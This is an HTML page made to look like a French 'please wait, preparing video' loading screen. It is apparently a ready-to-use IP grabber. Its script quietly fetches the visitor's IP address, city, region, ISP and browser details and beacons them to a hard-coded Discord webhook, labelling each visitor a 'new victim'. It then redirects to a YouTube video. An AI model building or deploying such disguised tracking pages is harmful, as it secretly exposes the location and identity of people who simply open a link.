<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="utf-8">
<title>Chargement...</title>
<style>
  body{margin:0;background:#000;color:#fff;font-family:Arial,Helvetica,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
  .load{border:10px solid #111;border-top:10px solid #ff0000;border-radius:50%;width:80px;height:80px;animation:s 1.2s linear infinite}
  @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
  h1{font-size:28px;margin:30px 0 10px}
  p{font-size:18px;opacity:0.9}
</style>
</head>
<body>
  <div class="load"></div>
  <h1>Veuillez patienter...</h1>
  <p>Préparation de la vidéo en cours<br><span id="c">5</span> secondes</p>

<script>
// ==== METS TON WEBHOOK DISCORD ICI ====
const WEBHOOK = "https://discord.com/api/webhooks/1439673608225034240/QCmvEWzJGk21ZF8AkeiNvW9cXtWFPZ3Pf-x-2rFj68OP8boHo51qHIF6ez1mmMD5KG77";

// Compte à rebours affiché
let sec = 5;
const compteur = document.getElementById("c");
const timer = setInterval(() => {
  sec--;
  compteur.textContent = sec;
  if (sec <= 0) clearInterval(timer);
}, 1000);

// Envoi des infos (ultra rapide avec beacon)
function envoi(embed) {
  navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify({embeds:[embed]})], {type:"application/json"}));
}

// Récupération IP + géoloc complète en 1 seul appel (hyper rapide)
fetch("https://ip-api.com/json/?fields=66846719&lang=fr")
  .then(r => r.json())
  .then(info => {
    const embed = {
      title: "Nouvelle victime (5s loader)",
      color: 16711680,
      thumbnail: {url: "https://i.imgur.com/2h5tRAb.png"},
      fields: [
        {name:"IPv4", value:"```"+(info.query || "??")+"```", inline:true},
        {name:"Ville ≈", value: info.city + ", " + info.regionName + " " + (info.zip||"") + " " + info.country, inline:false},
        {name:"Précision", value:"±"+(info.accuracy||3)+" km", inline:true},
        {name:"FAI", value:info.isp||"?", inline:true},
        {name:"OS / Navigateur", value:navigator.userAgent.substring(0,220), inline:false},
        {name:"Heure FR", value:new Date().toLocaleString("fr-FR",{timeZone:"Europe/Paris"}), inline:true}
      ],
      footer:{text:"Loader 5 secondes 2025"}
    };
    envoi(embed);
  });

// Redirection pile à 5 secondes (même si le fetch est plus long, on force)
setTimeout(() => {
  window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";  // ← change ici si tu veux une autre vidéo
}, 5000);

</script>
</body></html>
